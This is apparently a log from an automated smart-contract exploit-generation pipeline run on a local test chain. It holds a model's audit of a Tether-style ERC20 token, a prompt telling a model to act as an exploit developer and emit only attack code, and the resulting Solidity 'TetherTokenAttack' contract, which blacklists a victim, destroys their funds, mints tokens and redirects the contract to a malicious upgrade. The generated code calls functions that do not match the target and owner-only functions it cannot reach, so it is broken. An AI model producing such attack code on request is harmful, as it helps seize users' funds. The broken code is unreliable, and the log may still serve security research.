Blacklist and Destroy Black Funds Function:**\n\n- `destroyBlackFunds(address _blackListedUser)` allows owner to zero out the balance of any blacklisted user and reduce total supply accordingly.\n\n- No user consent or checks beyond blacklist status.\n\n**Impact:**  \nOwner can arbitrarily confiscate tokens from any blacklisted user, which can be abused or lead to loss of user funds.\n\n---\n\n**C. Upgradeability Risks:**\n\n- `deprecate(address _upgradedAddress)` allows owner to mark the contract as deprecated and forward all ERC20 calls to the upgraded contract.\n\n- The upgraded contract address is fully controlled by the owner.\n\n**Impact:**  \nOwner can upgrade to malicious contract and steal tokens or break functionality. Users interacting with the deprecated contract will be redirected to the new contract, which may have arbitrary logic.\n\n---\n\n**D. Fee Parameters:**\n\n- Owner can set fees with `setParams(uint newBasisPoints, uint newMaxFee)` with limits:\n\n  - `newBasisPoints < 20` (max 0.2%)\n  - `newMaxFee < 50` (max 50 tokens, scaled by decimals)\n\n- Fees are deducted on transfers and credited to owner.\n\n**Impact:**  \nOwner can impose fees on all transfers, which may be unexpected by users.\n\n---\n\n**E. ERC20 Approve Race Condition:**\n\n- The approve function requires allowance to be zero before setting a new non-zero allowance:\n\n  ```solidity\n  require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\n  ```\n\n- This is a known mitigation for the ERC20 approve race condition, so no issue here.\n\n---\n\n**F. No Reentrancy or Math Vulnerabilities:**\n\n- Uses SafeMath for all arithmetic.\n\n- No external calls during state changes except events and upgrade forwarding.\n\n- No payable functions or ETH handling.\n\n---\n\n**G. No Access Control on `transferOwnership` to zero address:**\n\n- The `transferOwnership` function prevents setting owner to zero address:\n\n  ```solidity\n  if (newOwner != address(0)) {\n      owner = newOwner;\n  }\n  ```\n\n- So no risk of owner renouncing ownership accidentally.\n\n---\n\n3. Exploitation Requirements:\n\n- Exploitation of owner privileges requires control of the owner private key.\n\n- No direct vulnerability allows an attacker to escalate privileges or bypass owner controls.\n\n- Users must trust the owner not to misuse blacklist, destroyBlackFunds, issue, redeem, deprecate, or fee-setting functions.\n\n---\n\n**Summary:**\n\n- The contract is a centralized token with owner having powerful controls over token supply, user balances (via blacklist and destroy), pausing, and upgradeability.\n\n- No technical vulnerabilities like reentrancy, integer overflow, or access control bypasses are present.\n\n- The main risk is **centralization and trust in the owner**, who can arbitrarily confiscate tokens, impose fees, pause transfers, mint tokens, or upgrade to malicious contracts.\n\n---\n\n**Solidity Version:**  \n`pragma solidity ^0.4.17;`', 'contract_analysis': '- The main contract with business logic and user funds is **TetherToken**, an ERC20 token contract with additional features:\n  - Pausable functionality (pause/unpause by owner)\n  - Blacklist functionality (owner can blacklist addresses, preventing transfers)\n  - Upgradeability mechanism (can deprecate itself and forward calls to an upgraded contract)\n  - Fee mechanism (basisPointsRate and maximumFee, though initially set to zero)\n  - Minting (issue) and burning (redeem) tokens by owner\n  - Ability for owner to destroy tokens of blacklisted users (destroyBlackFunds)\n  \n- Other contracts (Ownable, Pausable, BlackList, StandardToken, BasicToken, SafeMath) are standard utility or base contracts supporting TetherToken.\n\n- Solidity version pragma is `^0.4.17`.\n\n2.', 'vulnerability_assessment': '**A. Centralization / Owner Privileges:**\n\n- The owner has extensive control:\n  - Can pause/unpause all token transfers.\n  - Can blacklist any address, blocking their transfers.\n  - Can destroy tokens of blacklisted addresses, effectively confiscating user funds.\n  - Can issue new tokens arbitrarily, inflating supply and crediting self.\n  - Can redeem (burn) tokens from own balance.\n  - Can deprecate the contract and redirect all calls to an upgraded contract.\n  - Can set fee parameters (basisPointsRate and maximumFee).\n\n**Impact:**  \nThis centralization means the owner can censor users, confiscate tokens, inflate supply, and upgrade to arbitrary code. This is a trust assumption risk rather than a technical bug, but it is a critical security consideration.\n\n---\n\n**B. Blacklist and Destroy Black Funds Function:**\n\n- `destroyBlackFunds(address _blackListedUser)` allows owner to zero out the balance of any blacklisted user and reduce total supply accordingly.\n\n- No user consent or checks beyond blacklist status.\n\n**Impact:**  \nOwner can arbitrarily confiscate tokens from any blacklisted user, which can be abused or lead to loss of user funds.\n\n---\n\n**C. Upgradeability Risks:**\n\n- `deprecate(address _upgradedAddress)` allows owner to mark the contract as deprecated and forward all ERC20 calls to the upgraded contract.\n\n- The upgraded contract address is fully controlled by the owner.\n\n**Impact:**  \nOwner can upgrade to malicious contract and steal tokens or break functionality. Users interacting with the deprecated contract will be redirected to the new contract, which may have arbitrary logic.\n\n---\n\n**D. Fee Parameters:**\n\n- Owner can set fees with `setParams(uint newBasisPoints, uint newMaxFee)` with limits:\n\n  - `newBasisPoints < 20` (max 0.2%)\n  - `newMaxFee < 50` (max 50 tokens, scaled by decimals)\n\n- Fees are deducted on transfers and credited to owner.\n\n**Impact:**  \nOwner can impose fees on all transfers, which may be unexpected by users.\n\n---\n\n**E. ERC20 Approve Race Condition:**\n\n- The approve function requires allowance to be zero before setting a new non-zero allowance:\n\n  ```solidity\n  require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\n  ```\n\n- This is a known mitigation for the ERC20 approve race condition, so no issue here.\n\n---\n\n**F. No Reentrancy or Math Vulnerabilities:**\n\n- Uses SafeMath for all arithmetic.\n\n- No external calls during state changes except events and upgrade forwarding.\n\n- No payable functions or ETH handling.\n\n---\n\n**G. No Access Control on `transferOwnership` to zero address:**\n\n- The `transferOwnership` function prevents setting owner to zero address:\n\n  ```solidity\n  if (newOwner != address(0)) {\n      owner = newOwner;\n  }\n  ```\n\n- So no risk of owner renouncing ownership accidentally.\n\n---\n\n3.', 'exploitation_requirements': '- Exploitation of owner privileges requires control of the owner private key.\n\n- No direct vulnerability allows an attacker to escalate privileges or bypass owner controls.\n\n- Users must trust the owner not to misuse blacklist, destroyBlackFunds, issue, redeem, deprecate, or fee-setting functions.', 'analysis_duration': 25.820976734161377}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: - The main contract with business logic and user funds is **TetherToken**, an ERC20 token contract with additional features:\n  - Pausable functionality (pause/unpause by owner)\n  - Blacklist functionality (owner can blacklist addresses, preventing transfers)\n  - Upgradeability mechanism (can deprecate itself and forward calls to an upgraded contract)\n  - Fee mechanism (basisPointsRate and maximumFee, though initially set to zero)\n  - Minting (issue) and burning (redeem) tokens by owner\n  - Ability for owner to destroy tokens of blacklisted users (destroyBlackFunds)\n  \n- Other contracts (Ownable, Pausable, BlackList, StandardToken, BasicToken, SafeMath) are standard utility or base contracts supporting TetherToken.\n\n- Solidity version pragma is `^0.4.17`.\n\n2.\n\nVulnerability Assessment: **A. Centralization / Owner Privileges:**\n\n- The owner has extensive control:\n  - Can pause/unpause all token transfers.\n  - Can blacklist any address, blocking their transfers.\n  - Can destroy tokens of blacklisted addresses, effectively confiscating user funds.\n  - Can issue new tokens arbitrarily, inflating supply and crediting self.\n  - Can redeem (burn) tokens from own balance.\n  - Can deprecate the contract and redirect all calls to an upgraded contract.\n  - Can set fee parameters (basisPointsRate and maximumFee).\n\n**Impact:**  \nThis centralization means the owner can censor users, confiscate tokens, inflate supply, and upgrade to arbitrary code. This is a trust assumption risk rather than a technical bug, but it is a critical security consideration.\n\n---\n\n**B. Blacklist and Destroy Black Funds Function:**\n\n- `destroyBlackFunds(address _blackListedUser)` allows owner to zero out the balance of any blacklisted user and reduce total supply accordingly.\n\n- No user consent or checks beyond blacklist status.\n\n**Impact:**  \nOwner can arbitrarily confiscate tokens from any blacklisted user, which can be abused or lead to loss of user funds.\n\n---\n\n**C. Upgradeability Risks:**\n\n- `deprecate(address _upgradedAddress)` allows owner to mark the contract as deprecated and forward all ERC20 calls to the upgraded contract.\n\n- The upgraded contract address is fully controlled by the owner.\n\n**Impact:**  \nOwner can upgrade to malicious contract and steal tokens or break functionality. Users interacting with the deprecated contract will be redirected to the new contract, which may have arbitrary logic.\n\n---\n\n**D. Fee Parameters:**\n\n- Owner can set fees with `setParams(uint newBasisPoints, uint newMaxFee)` with limits:\n\n  - `newBasisPoints < 20` (max 0.2%)\n  - `newMaxFee < 50` (max 50 tokens, scaled by decimals)\n\n- Fees are deducted on transfers and credited to owner.\n\n**Impact:**  \nOwner can impose fees on all transfers, which may be unexpected by users.\n\n---\n\n**E. ERC20 Approve Race Condition:**\n\n- The approve function requires allowance to be zero before setting a new non-zero allowance:\n\n  ```solidity\n  require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\n  ```\n\n- This is a known mitigation for the ERC20 approve race condition, so no issue here.\n\n---\n\n**F. No Reentrancy or Math Vulnerabilities:**\n\n- Uses SafeMath for all arithmetic.\n\n- No external calls during state changes except events and upgrade forwarding.\n\n- No payable functions or ETH handling.\n\n---\n\n**G. No Access Control on `transferOwnership` to zero address:**\n\n- The `transferOwnership` function prevents setting owner to zero address:\n\n  ```solidity\n  if (newOwner != address(0)) {\n      owner = newOwner;\n  }\n  ```\n\n- So no risk of owner renouncing ownership accidentally.\n\n---\n\n3.\n\nExploitation Requirements: - Exploitation of owner privileges requires control of the owner private key.\n\n- No direct vulnerability allows an attacker to escalate privileges or bypass owner controls.\n\n- Users must trust the owner not to misuse blacklist, destroyBlackFunds, issue, redeem, deprecate, or fee-setting functions.\n\n\nTarget Contract Address: 0x59d3631c86BbE35EF041872d502F218A39FBa150\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.4.17\n", 'attack_raw_response': "```solidity\npragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(address _to, uint _amount) external;\n    function redeem(uint _amount) external;\n    function deprecate(address _upgradedAddress) external;\n    function setParams(uint newBasisPoints, uint newMaxFee) external;\n    function transferOwnership(address newOwner) external;\n}\n\ncontract TetherTokenAttack {\n    ITetherToken public target;\n\n    function TetherTokenAttack(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgradedContract) public {\n        // Blacklist victim\n        target.blacklist(victim);\n        // Destroy victim's tokens\n        target.destroyBlackFunds(victim);\n        // Mint new tokens to attacker (this contract)\n        target.issue(this, 1000 ether);\n        // Redeem some tokens from attacker\n        target.redeem(500 ether);\n        // Set fees to max allowed (0.2% and 50 tokens)\n        target.setParams(20, 50);\n        // Deprecate to upgraded malicious contract\n        target.deprecate(upgradedContract);\n    }\n}\n```", 'code': "pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(address _to, uint _amount) external;\n    function redeem(uint _amount) external;\n    function deprecate(address _upgradedAddress) external;\n    function setParams(uint newBasisPoints, uint newMaxFee) external;\n    function transferOwnership(address newOwner) external;\n}\n\ncontract TetherTokenAttack {\n    ITetherToken public target;\n\n    function TetherTokenAttack(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgradedContract) public {\n        // Blacklist victim\n        target.blacklist(victim);\n        // Destroy victim's tokens\n        target.destroyBlackFunds(victim);\n        // Mint new tokens to attacker (this contract)\n        target.issue(this, 1000 ether);\n        // Redeem some tokens from attacker\n        target.redeem(500 ether);\n        // Set fees to max allowed (0.2% and 50 tokens)\n        target.setParams(20, 50);\n        // Deprecate to upgraded malicious contract\n        target.deprecate(upgradedContract);\n    }\n}", 'code_type': 'solidity', 'attack_duration': 5.431528806686401}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp5_sqpw4u.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0x59d3631c86BbE35EF041872d502F218A39FBa150",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0x59d3631c86BbE35EF041872d502F218A39FBa150": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99842250980000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 93998306520000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0x0290FB167208Af455bB137780163b7B7a9a10C16",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x0290FB167208Af455bB137780163b7B7a9a10C16": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99842250980000000000,\n        